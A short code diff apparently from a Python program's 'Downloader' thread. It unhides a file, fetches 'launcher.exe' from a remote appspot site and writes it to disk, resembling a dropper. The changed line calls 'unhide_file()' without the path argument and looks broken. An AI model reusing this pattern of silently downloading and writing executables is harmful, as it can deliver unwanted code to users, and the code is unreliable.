@@ -41,10 +41,7 @@ class Downloader(threading.Thread):
         unhide_file(path)
         #Save the launcher
         url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
-        try:
-            win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_NORMAL)
-        except:
-            pass
+        unhide_file()
         f = open(path, "w")
         f.write(url.read())
         f.close()
